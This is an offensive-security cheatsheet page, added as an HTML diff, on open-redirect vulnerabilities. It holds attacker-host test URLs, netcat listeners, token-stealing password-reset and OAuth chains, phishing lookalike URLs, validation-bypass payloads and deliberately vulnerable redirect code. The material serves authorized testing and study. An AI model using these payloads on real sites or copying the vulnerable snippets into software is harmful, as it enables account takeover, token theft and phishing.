@@ -1,0 +1,418 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Open Redirect · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › Sessions</nav><h1>Open Redirect</h1><p class="cx-lede">When an application&#x27;s redirection functionality accepts a victim-controlled URL without validation - parameter discovery patterns, the token-leak primitive where session/CSRF/reset tokens travel into attacker-controlled URLs, phishing chains, and the defenses (whitelist, mapped values, confirm page).</p><div class="cx-tags"><span class="cx-tag">MITRE T1539, T1212</span><span class="cx-tag">D3FEND D3-IAA</span><span class="cx-tag">IMPACT SessionTakeover, PhishingDelivery, CredentialTheft</span><span class="cx-tag">OWASP A01</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>An open redirect is a server-side redirection (<code>Location:</code> header) controlled by attacker-supplied input without validation. Two distinct impacts: phishing (legitimate domain bounces victim to attacker domain) and <em>token leakage</em> (the request that follows the redirect carries session, CSRF, or reset tokens to the attacker). The second is the session-attack-relevant one.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Find the redirect parameter
+http://target/?url=...        ?redirect= ?next= ?return= ?goto= ?dest=
+                              (~20 common names - full list below)
+
+# 2. Confirm it accepts external URLs
+http://target/page?url=http://ATTACKER:1337/
+nc -nlvp 1337         # listener on attacker
+
+# 3. If POST or follow-up request contains tokens, harvest them
+#    The classic chain: password reset page redirects to attacker&#x27;s URL
+#    with the reset token in the body or query string
+
+# 4. Phishing variant: send legitimate-looking URL that lands on attacker domain
+http://trusted.com/?redirect=http://trusted.com.evil.com/login</code></pre></figure>
+<p>Success indicator: a request you didn't initiate arrives at your listener - and contains a token (session ID, CSRF token, password reset token, OAuth code) you can immediately reuse.</p>
+<h2 id="the-vulnerability-in-five-lines-of-php">The vulnerability in five lines of PHP</h2>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php
+$red = $_GET[&#x27;url&#x27;];
+header(&quot;Location: &quot; . $red);
+?&gt;</code></pre></figure>
+<p>The <code>Location</code> header tells the browser to navigate to whatever URL is in the response. With no validation on <code>$red</code>, the attacker controls the destination. <code>http://target/redirect.php?url=http://evil.com/</code> bounces the victim to <code>evil.com</code>.</p>
+<p>The same pattern exists in every language:</p>
+<table>
+<thead>
+<tr>
+<th>Language</th>
+<th>Pattern</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PHP</td>
+<td><code>header("Location: " . $_GET['url']);</code></td>
+</tr>
+<tr>
+<td>Java (Servlet)</td>
+<td><code>response.sendRedirect(request.getParameter("url"));</code></td>
+</tr>
+<tr>
+<td>.NET</td>
+<td><code>Response.Redirect(Request.QueryString["url"]);</code></td>
+</tr>
+<tr>
+<td>Python (Flask)</td>
+<td><code>return redirect(request.args.get('next'))</code></td>
+</tr>
+<tr>
+<td>Python (Django)</td>
+<td><code>return HttpResponseRedirect(request.GET.get('next'))</code></td>
+</tr>
+<tr>
+<td>Node.js (Express)</td>
+<td><code>res.redirect(req.query.url);</code></td>
+</tr>
+<tr>
+<td>Ruby (Rails)</td>
+<td><code>redirect_to params[:return_to]</code></td>
+</tr>
+</tbody>
+</table>
+<p>All are vulnerable in this naive form. The fix is always "validate the URL"; the typical mistake is "the URL has my domain in it somewhere, so it's fine."</p>
+<h2 id="parameter-discovery">Parameter discovery</h2>
+<p>Common parameter names, in rough order of frequency:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?url=         ?redirect=        ?next=
+?return=      ?return_to=       ?returnurl=
+?redirect_uri= ?redirect_to=    ?redir=
+?goto=        ?go=              ?dest=
+?destination= ?continue=        ?forward=
+?fromurl=     ?fromuri=         ?from=
+?newurl=      ?exit=            ?exitpage=
+?out=         ?view=            ?loc=
+?location=    ?image_url=       ?host=
+?domain=      ?callback=        ?callback_url=</code></pre></figure>
+<p>Where to look:</p>
+<ul>
+<li><strong>Login pages</strong> - <code>?next=</code>, <code>?return_to=</code>, common pattern: user lands on <code>/login?next=/protected</code>, after authenticating gets redirected to <code>/protected</code>. Replace <code>/protected</code> with attacker URL.</li>
+<li><strong>Logout pages</strong> - <code>?redirect=</code> is common ("after logout, go here")</li>
+<li><strong>Password reset confirmation</strong> - the reset email's link often contains <code>?redirect_uri=</code></li>
+<li><strong>OAuth flows</strong> - <code>?redirect_uri=</code> is core to OAuth; misconfigured validation is a major source of OAuth attacks</li>
+<li><strong>Click-tracking URLs</strong> - newsletters and marketing emails wrap links in <code>tracker.target.com/?url=actual-destination</code></li>
+<li><strong>API webhooks</strong> - <code>?callback=</code> parameters in API documentation</li>
+</ul>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Spider the site and grep for redirect-y parameters in URLs
+gospider -s &quot;http://target/&quot; -o output/ -t 10 -d 3
+grep -hoE &#x27;\?[a-z_]*=&#x27; output/*.txt | sort -u | grep -E &#x27;url|redir|next|return|goto&#x27;
+
+# Or from Burp&#x27;s Target → Site Map → search for any query parameter</code></pre></figure>
+<h2 id="detection">Detection</h2>
+<h3 id="manual-probe">Manual probe</h3>
+<p>For each candidate parameter, test with an external URL:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ curl -is &#x27;http://target/login?next=http://attacker.com/&#x27;
+HTTP/1.1 302 Found
+Location: http://attacker.com/        ← unvalidated; vulnerable</code></pre></figure>
+<p>If the response redirects to your URL, it's exploitable. If it strips the URL, replaces with a default, or returns an error: validated. Common responses:</p>
+<ul>
+<li><code>Location: http://attacker.com/</code> → vulnerable</li>
+<li><code>Location: /home</code> → validated, attacker URL discarded</li>
+<li><code>Location: http://target/</code> → validated, attacker URL replaced</li>
+<li><code>400 Bad Request</code> → validated, request rejected</li>
+</ul>
+<h3 id="active-listener">Active listener</h3>
+<p>Set up a listener and trigger the redirect end-to-end:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Listener
+$ nc -nlvp 1337
+
+# Trigger (open in a browser as the victim would)
+$ curl -L &#x27;http://target/login?next=http://YOUR-IP:1337/&#x27;</code></pre></figure>
+<p>The <code>-L</code> makes curl follow redirects. On your listener:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>listening on [any] 1337 ...
+connect to [YOUR-IP] from target.com [TARGET-IP] 54322
+GET / HTTP/1.1
+Host: YOUR-IP:1337
+User-Agent: curl/7.81.0
+Accept: */*
+Referer: http://target/login?next=http://YOUR-IP:1337/</code></pre></figure>
+<p>The Referer reveals the originating URL - useful for proving the redirect actually came from the target.</p>
+<h2 id="the-token-leak-primitive">The token-leak primitive</h2>
+<p>This is the operationally important variant - the redirect carries a token that you wouldn't otherwise have access to.</p>
+<h3 id="scenario-password-reset-flow">Scenario: password reset flow</h3>
+<p>A common pattern in password reset:</p>
+<ol>
+<li>User clicks reset link in email: <code>http://target/reset?token=ABC123&amp;redirect_uri=/complete.html</code></li>
+<li>User enters new password on the reset form</li>
+<li>Form POSTs <code>token=ABC123&amp;password=newpass&amp;redirect_uri=/complete.html</code> to <code>/reset</code></li>
+<li>After successful reset, server redirects to <code>redirect_uri</code> - the URL trusted from the <em>original</em> link</li>
+<li>The Referer header on the followup request contains the reset URL with the token</li>
+</ol>
+<p>If the attacker can craft the reset link, they can set <code>redirect_uri</code> to their own URL:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://target/reset?token=VICTIM_TOKEN&amp;redirect_uri=http://attacker.com/</code></pre></figure>
+<p>The victim opens the link (thinking it's a legit reset), enters a new password, submits. The server processes the reset, redirects to <code>http://attacker.com/</code>. The attacker's server sees:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Referer: http://target/reset?token=VICTIM_TOKEN&amp;...</code></pre></figure>
+<p>The token is now visible to the attacker. They can replay the reset URL themselves, set a <em>different</em> new password, and take over the account.</p>
+<p>But waiting - the victim already used the token, hasn't it been invalidated? Yes, in well-designed reset flows. But the attacker has other tokens too:</p>
+<ul>
+<li>The post-reset session cookie (now valid for the victim's account)</li>
+<li>Any anti-CSRF token in the redirect-following request</li>
+<li>OAuth codes in OAuth flows</li>
+</ul>
+<h3 id="scenario-oauth-callback-hijacking">Scenario: OAuth callback hijacking</h3>
+<p>The OAuth flow:</p>
+<ol>
+<li>App redirects user to provider (Google, GitHub) with <code>redirect_uri=http://target/oauth/callback</code></li>
+<li>User authorizes</li>
+<li>Provider redirects back to <code>redirect_uri</code> with <code>?code=AUTH_CODE</code></li>
+<li>App exchanges code for access token</li>
+</ol>
+<p>If the provider validates <code>redirect_uri</code> loosely and the app has an open redirect on its callback path:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://provider.com/auth?client_id=X&amp;redirect_uri=http://target/oauth/callback?next=http://attacker.com/</code></pre></figure>
+<p>Provider sends user to <code>http://target/oauth/callback?next=http://attacker.com/&amp;code=AUTH_CODE</code>. Target's callback handler processes the code (logs the user in) <em>and</em> redirects to <code>next=http://attacker.com/?code=AUTH_CODE</code>. Attacker now has the auth code.</p>
+<p>Variants exist for every step of the OAuth chain. See OAuth-specific writeups for the full taxonomy.</p>
+<h3 id="scenario-typical-submit-solution-endpoint">Scenario: typical submit-solution endpoint</h3>
+<p>The typical scenario: a <code>/submit-solution?url=...</code> endpoint that, when an admin "submits a solution," redirects the admin's browser to the provided URL. Combined with a stored-XSS profile, you can:</p>
+<ol>
+<li>Plant XSS in your profile that doesn't fire on your own viewing (defenders won't notice)</li>
+<li>Submit a "solution" with <code>url=http://your-profile-with-XSS</code></li>
+<li>Admin reviews submissions; clicks through; lands on your profile; XSS fires in admin's context</li>
+<li>XSS exfils admin's session cookie</li>
+</ol>
+<p>This is the canonical end-to-end chain in the <a href="../chaining-final/index.html">Chaining Final</a> walkthrough.</p>
+<h2 id="phishing-chains">Phishing chains</h2>
+<p>The non-token use case: an open redirect on a trusted domain makes phishing links look legitimate:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Phishing email:
+&quot;Click here to verify your bank account: http://trusted-bank.com/verify?next=http://trusted-bank.com.evil.com/login&quot;</code></pre></figure>
+<p>Many email-security tools and humans evaluate the URL's domain at a glance. <code>http://trusted-bank.com/...</code> looks legitimate; the <code>?next=</code> parameter is overlooked. After the click, the redirect bounces to <code>trusted-bank.com.evil.com</code> which looks similar enough to confuse the victim.</p>
+<p>This is why open redirect is taken seriously even when there's no obvious token at risk - the attack surface is "victim trust in URL inspection," which is wide.</p>
+<h3 id="url-obfuscation-tricks">URL obfuscation tricks</h3>
+<p>To make the malicious URL less visible:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://trusted.com/?next=http%3A%2F%2Fevil.com%2F      ← URL-encoded
+http://trusted.com/?next=//evil.com/                   ← protocol-relative
+http://trusted.com/?next=https:evil.com                ← whitespace in middle
+http://trusted.com/?next=javascript:alert(1)           ← javascript: scheme (DOM-based effect)
+http://trusted.com/?next=data:text/html,&lt;script&gt;...    ← data: URI
+http://trusted.com/?next=/\\evil.com/                  ← backslash, some parsers OK
+http://trusted.com/?next=//evil%E3%80%82com            ← Unicode lookalike for &quot;.&quot;</code></pre></figure>
+<p>Each tests a different validation gap:</p>
+<table>
+<thead>
+<tr>
+<th>Trick</th>
+<th>Bypasses</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>URL encoding</td>
+<td>Validation that runs before URL-decoding</td>
+</tr>
+<tr>
+<td><code>//evil.com</code></td>
+<td>Validation that only blocks <code>http://</code> and <code>https://</code></td>
+</tr>
+<tr>
+<td><code>https:evil.com</code></td>
+<td>Parsers that interpret loosely</td>
+</tr>
+<tr>
+<td><code>javascript:</code></td>
+<td>Some apps allow data/javascript schemes</td>
+</tr>
+<tr>
+<td><code>data:</code> URI</td>
+<td>Same</td>
+</tr>
+<tr>
+<td>Backslash</td>
+<td>Some parsers treat <code>\</code> as <code>/</code></td>
+</tr>
+<tr>
+<td>Unicode lookalikes</td>
+<td>Validation comparing exact strings</td>
+</tr>
+</tbody>
+</table>
+<h2 id="validation-bypasses">Validation bypasses</h2>
+<p>Common validations and their bypasses:</p>
+<h3 id="starts-with-our-domain">"Starts with our domain"</h3>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">if url.startswith(&#x27;http://target.com&#x27;):
+    redirect(url)</code></pre></figure>
+<p>Bypass:</p>
+<ul>
+<li><code>http://target.com.evil.com/</code> - starts with <code>http://target.com</code> (note the dot)</li>
+<li><code>http://target.com@evil.com/</code> - the <code>@</code> makes target.com the userinfo, evil.com the host</li>
+</ul>
+<h3 id="contains-our-domain">"Contains our domain"</h3>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">if &#x27;target.com&#x27; in url:
+    redirect(url)</code></pre></figure>
+<p>Bypass: any URL with <code>target.com</code> in the path / query:</p>
+<ul>
+<li><code>http://evil.com/?fake=target.com</code></li>
+<li><code>http://target.com.evil.com/</code></li>
+<li><code>http://eviltarget.com/</code></li>
+</ul>
+<h3 id="domain-matches-a-regex">"Domain matches a regex"</h3>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">if re.match(r&#x27;^https?://target\.com&#x27;, url):
+    redirect(url)</code></pre></figure>
+<p>The regex anchors <code>^</code> (start) but not <code>$</code> (end), so:</p>
+<ul>
+<li><code>http://target.com.evil.com/</code> matches (the regex matches the first 18 chars)</li>
+</ul>
+<p>If the regex has <code>$</code>:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">if re.match(r&#x27;^https?://target\.com$&#x27;, url):
+    redirect(url)</code></pre></figure>
+<p>Then the URL has to be exactly <code>http://target.com</code> - no path, no query - which is rarely useful and forces the developer to use a less strict regex.</p>
+<h3 id="has-a-trusted-domain-in-the-host">"Has a trusted domain in the host"</h3>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">host = urlparse(url).hostname
+if host in ALLOWED_HOSTS:
+    redirect(url)</code></pre></figure>
+<p>Bypass via:</p>
+<ul>
+<li>Subdomain takeover on an allowed host (you control a subdomain registered as allowed)</li>
+<li>Open redirect on an allowed host - chain redirects through <code>target.com → trusted.com → evil.com</code></li>
+</ul>
+<h3 id="strip-the-protocol-check-the-path">"Strip the protocol, check the path"</h3>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python"># Bad - assumes URL is relative
+if url.startswith(&#x27;/&#x27;):
+    redirect(url)</code></pre></figure>
+<p>Bypass: protocol-relative URLs that start with <code>/</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://target/redirect?url=//evil.com/</code></pre></figure>
+<p>The redirect destination is <code>//evil.com/</code> which the browser interprets as <code>http://evil.com/</code> (protocol-relative).</p>
+<h3 id="whitelisted-prefix-bypass">Whitelisted-prefix bypass</h3>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">ALLOWED_PREFIXES = [&#x27;/account&#x27;, &#x27;/dashboard&#x27;]
+if any(url.startswith(p) for p in ALLOWED_PREFIXES):
+    redirect(url)</code></pre></figure>
+<p>Bypass:</p>
+<ul>
+<li><code>/account@evil.com/</code> - starts with <code>/account</code> but is parsed as URL with user <code>account</code> and host <code>evil.com</code></li>
+<li><code>/account/../../../../evil.com</code> - combined with path-traversal-tolerant downstream code</li>
+</ul>
+<h2 id="worked-open-redirect-chain">Worked open-redirect chain</h2>
+<p>A representative scenario: <code>oredirect.example.net</code> redirects after entering an email. The flow:</p>
+<ol>
+<li>Visit <code>http://oredirect.example.net/?redirect_uri=/complete.html&amp;token=ABC123</code></li>
+<li>Enter email → POST to <code>/complete.html</code> with <code>token=ABC123</code> and form data</li>
+<li>After POST, server redirects to <code>redirect_uri</code> value</li>
+</ol>
+<p>The vulnerability: <code>redirect_uri</code> is the user-controllable destination.</p>
+<p>Attack:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># 1. Set up listener
+$ nc -lvnp 1337
+listening on [any] 1337 ...
+
+# 2. Set the redirect URI to attacker URL - craft this link:
+#    http://oredirect.example.net/?redirect_uri=http://YOUR-IP:1337&amp;token=ABC123
+
+# 3. Send to victim (or in test scenario, browse it yourself in a private window)
+#    Victim enters email, submits → POST → redirect chain</code></pre></figure>
+<p>On the listener:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>connect to [YOUR-IP] from oredirect.example.net 54322
+POST / HTTP/1.1
+Host: YOUR-IP:1337
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+...
+
+email=victim@example.com&amp;token=ABC123</code></pre></figure>
+<p>The listener catches <em>the full POST</em> - including the <code>token</code>. The redirect causes the browser to re-issue the POST to the new URL. (Browsers handle 307/308 redirects this way; for 301/302 GET-after-POST is the default, but some apps respond with 307.)</p>
+<p>Even if the redirect is a GET (302), the token may still be in the URL or Referer:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>GET /?token=ABC123 HTTP/1.1
+Referer: http://oredirect.example.net/?redirect_uri=http://YOUR-IP:1337&amp;token=ABC123</code></pre></figure>
+<p>Either way, the token is now in the attacker's logs.</p>
+<h2 id="defenses">Defenses</h2>
+<p>For the operator's purposes, knowing the defenses tells you what to test:</p>
+<table>
+<thead>
+<tr>
+<th>Defense</th>
+<th>Bypass to try</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Whitelist of exact destinations</td>
+<td>Find a destination on the whitelist that itself has an open redirect</td>
+</tr>
+<tr>
+<td>Mapped values (<code>?dest=1</code> → URL from lookup table)</td>
+<td>Look for the lookup file/DB to leak more entries</td>
+</tr>
+<tr>
+<td>Confirm-redirect page</td>
+<td>Bypass if the confirm step has its own redirect parameter, or if the page can be skipped via direct URL</td>
+</tr>
+<tr>
+<td>Origin/Referer check</td>
+<td>Strip Referer (via <code>&lt;meta name="referrer" content="no-referrer"&gt;</code>)</td>
+</tr>
+<tr>
+<td>Requires authenticated session</td>
+<td>Combine with a forced auth attack</td>
+</tr>
+<tr>
+<td>HSTS / Strict-Transport-Security</td>
+<td>Doesn't prevent open redirect (protocol-level defense, redirect is application-level)</td>
+</tr>
+</tbody>
+</table>
+<p>The confirm-redirect page is interesting - it's effective UX-wise (user sees the destination before navigating) but only if the page itself can't be skipped. Apps that use it sometimes have a "direct redirect" path for trusted referrers; that path is often less defended.</p>
+<h2 id="when-the-redirect-status-code-matters">When the redirect status code matters</h2>
+<ul>
+<li><strong>301 Moved Permanently</strong> - browsers may cache aggressively; first redirect is the only one tested</li>
+<li><strong>302 Found</strong> - temporary; browsers don't cache; method downgrade (POST → GET) on redirect</li>
+<li><strong>303 See Other</strong> - like 302 but explicit about method downgrade</li>
+<li><strong>307 Temporary Redirect</strong> - keeps the method (POST stays POST); this is the dangerous one for token leakage</li>
+<li><strong>308 Permanent Redirect</strong> - like 307 but cached</li>
+</ul>
+<p>For maximum token leak surface, you want the server to issue 307 or 308 - these preserve POST bodies across the redirect.</p>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Pattern</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Common parameter names</td>
+<td><code>?url=</code>, <code>?next=</code>, <code>?redirect=</code>, <code>?return=</code>, <code>?goto=</code>, <code>?dest=</code>, <code>?redirect_uri=</code></td>
+</tr>
+<tr>
+<td>Test for external redirect</td>
+<td><code>curl -is 'http://target/?url=http://attacker.com'</code></td>
+</tr>
+<tr>
+<td>Confirm via listener</td>
+<td><code>nc -nlvp 1337</code> and use that URL as the redirect target</td>
+</tr>
+<tr>
+<td>Capture redirect Referer</td>
+<td>Listener prints <code>Referer:</code> header in incoming requests</td>
+</tr>
+<tr>
+<td>Bypass startsWith check</td>
+<td><code>http://target.com.evil.com/</code>; <code>http://target.com@evil.com/</code></td>
+</tr>
+<tr>
+<td>Bypass contains check</td>
+<td><code>http://evil.com/?fake=target.com</code></td>
+</tr>
+<tr>
+<td>Bypass <code>//</code> prefix</td>
+<td><code>//evil.com/</code> (protocol-relative)</td>
+</tr>
+<tr>
+<td>Bypass with encoded</td>
+<td><code>%2f%2fevil.com%2f</code></td>
+</tr>
+<tr>
+<td>Bypass via subdomain</td>
+<td>Take over a dangling subdomain in the whitelist</td>
+</tr>
+<tr>
+<td>Token-leak post-reset</td>
+<td>Set reset's <code>redirect_uri</code> to attacker; capture token in Referer</td>
+</tr>
+<tr>
+<td>OAuth callback hijack</td>
+<td>Set <code>redirect_uri</code> to target's open redirect → attacker</td>
+</tr>
+<tr>
+<td>Phishing payload</td>
+<td><code>http://trusted.com/?next=http://trusted.com.evil.com/login</code></td>
+</tr>
+<tr>
+<td>Preserve POST across redirect</td>
+<td>Need 307/308 response - test by issuing POST + <code>Location:</code></td>
+</tr>
+</tbody>
+</table></article><nav class="cx-pager"><a class="cx-prev" href="../xss-csrf-chain/index.html">Previous: XSS + CSRF Chain</a><a class="cx-next" href="../chaining-final/index.html">Next: Chaining Final</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
